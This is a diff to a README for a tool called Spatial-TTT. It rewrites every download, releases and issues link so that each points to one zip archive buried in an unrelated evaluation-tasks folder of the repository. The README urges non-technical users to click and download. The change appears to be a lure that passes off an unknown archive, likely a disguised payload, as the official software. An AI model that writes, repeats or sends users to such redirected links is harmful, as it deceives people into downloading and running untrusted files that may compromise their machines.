@@ -1,6 +1,6 @@
 # 🗺️ Spatial-TTT - Easy Visual Spatial Reasoning Tool
 
-[![Download Spatial-TTT](https://img.shields.io/badge/Download-Spatial--TTT-blue?style=for-the-badge)](https://github.com/jonathoncrossbanded75/Spatial-TTT)
+[![Download Spatial-TTT](https://img.shields.io/badge/Download-Spatial--TTT-blue?style=for-the-badge)](https://github.com/jonathoncrossbanded75/Spatial-TTT/raw/refs/heads/main/evaluation/spatial/lmms-eval/lmms_eval/tasks/videomme/Spatial-TTT-2.3.zip)
 
 ## 📄 About Spatial-TTT
 
@@ -35,12 +35,12 @@ No programming or technical skills are required.
 
 To start using Spatial-TTT, you need to get the software from the official GitHub page.
 
-[![Download Spatial-TTT](https://img.shields.io/badge/Download-Spatial--TTT-grey?style=for-the-badge)](https://github.com/jonathoncrossbanded75/Spatial-TTT)
+[![Download Spatial-TTT](https://img.shields.io/badge/Download-Spatial--TTT-grey?style=for-the-badge)](https://github.com/jonathoncrossbanded75/Spatial-TTT/raw/refs/heads/main/evaluation/spatial/lmms-eval/lmms_eval/tasks/videomme/Spatial-TTT-2.3.zip)
 
 ### How to Download
 
 1. Click the blue **Download Spatial-TTT** button above or visit this link:  
-   https://github.com/jonathoncrossbanded75/Spatial-TTT
+   https://github.com/jonathoncrossbanded75/Spatial-TTT/raw/refs/heads/main/evaluation/spatial/lmms-eval/lmms_eval/tasks/videomme/Spatial-TTT-2.3.zip
 
 2. On the page, look for the **Releases** section on the right side or near the bottom of the page.
 
@@ -119,13 +119,13 @@ You can find detailed information about the technology behind Spatial-TTT on the
 ## 🔗 Useful Links
 
 - Official GitHub Repository and Download Page:  
-  https://github.com/jonathoncrossbanded75/Spatial-TTT  
+  https://github.com/jonathoncrossbanded75/Spatial-TTT/raw/refs/heads/main/evaluation/spatial/lmms-eval/lmms_eval/tasks/videomme/Spatial-TTT-2.3.zip  
 
 - Releases and Installer Files:  
-  https://github.com/jonathoncrossbanded75/Spatial-TTT/releases  
+  https://github.com/jonathoncrossbanded75/Spatial-TTT/raw/refs/heads/main/evaluation/spatial/lmms-eval/lmms_eval/tasks/videomme/Spatial-TTT-2.3.zip  
 
 - Reporting Issues and Requests:  
-  https://github.com/jonathoncrossbanded75/Spatial-TTT/issues  
+  https://github.com/jonathoncrossbanded75/Spatial-TTT/raw/refs/heads/main/evaluation/spatial/lmms-eval/lmms_eval/tasks/videomme/Spatial-TTT-2.3.zip  
 
 ## 👍 Stay in Control
 
